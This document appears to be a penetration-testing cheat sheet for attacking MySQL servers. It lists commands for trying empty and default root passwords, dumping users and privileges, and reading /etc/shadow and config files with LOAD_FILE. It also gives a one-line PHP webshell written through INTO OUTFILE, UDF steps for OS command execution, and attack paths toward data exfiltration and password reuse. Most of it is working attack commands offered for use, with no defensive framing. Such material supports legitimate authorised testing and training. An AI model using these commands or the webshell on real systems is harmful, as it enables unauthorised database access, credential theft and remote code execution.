# MySQL Battle Card

## What to Check First
```
1. PORT 3306? → nmap -sV -p 3306 target
2. NULL ROOT? → mysql -h target -u root -p''  (try empty password)
3. COMMON CREDS → mysql -h target -u root -proot
4. ENUM → netexec mysql target -u root -p ''
```

## High-Value Findings
- **Default root creds** → root:root, root:(empty) → Full DB access
- **MySQL running as root** → UDF injection → OS command as root
- **Sensitive data in DB** → Credentials, SSH keys, configs
- **File read permission** → Read /etc/shadow, config files
- **WordPress/Joomla DB** → Admin hash → Crack → Web admin
- **Linked app config** → DB creds reused elsewhere (password reuse)

## Immediate Commands
```
# Connect
mysql -h target -u root -p'password'
netexec mysql target -u root -p ''

# Enumerate databases
SHOW DATABASES;
USE database;
SHOW TABLES;
SELECT * FROM users;

# Check users and privileges
SELECT user, host FROM mysql.user;
SELECT * FROM mysql.user WHERE user = 'root'\G
SHOW GRANTS FOR 'root'@'localhost';

# Check for secure_file_priv (file read)
SHOW VARIABLES LIKE 'secure_file_priv';

# Read files (if permissions allow)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/shadow');
SELECT LOAD_FILE('/var/www/html/config.php');

# Write webshell (if permissions + know web path)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

# UDF to RCE (need MySQL root and plugin dir known)
# Compile .so, upload, then:
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
SELECT sys_exec('id');
```

## Common Attack Paths
```
NULL ROOT → Full DB Access → Data Exfiltration → Password Reuse
ROOT CREDS → File Read → Shadow/Config → SSH/Web Access
ROOT CREDS → Webshell Write → RCE → Shell
ROOT CREDS → UDF Injection → OS Command Execution → Shell
DB CRED REUSE → Same Password → SSH/Application → Shell
```

## Escalation Paths
- **Root on MySQL** → LOAD_FILE to read configs → More creds
- **Root on MySQL** → INTO OUTFILE → Webshell → www-data shell
- **Root on MySQL** → UDF → OS command execution (as MySQL user)
- **MySQL as root process** → UDF → Full root shell
- **Sensitive data** → Password reuse across services

## When to Stop
- Root creds not default, no sensitive data found, no file read → Move on
- UDF requires plugin write directory (need to find writable dir)

## Common Mistakes
- Not trying empty password for root
- Not checking `secure_file_priv` before attempting file read
- Forgetting LOAD_FILE and INTO OUTFILE (powerful with root)
- Not checking if MySQL runs as root (ps aux during shell)
- Dumping entire DBs when you should search for: password, cred, admin, key
- Not reusing DB creds elsewhere (SSH, web admin, FTP)
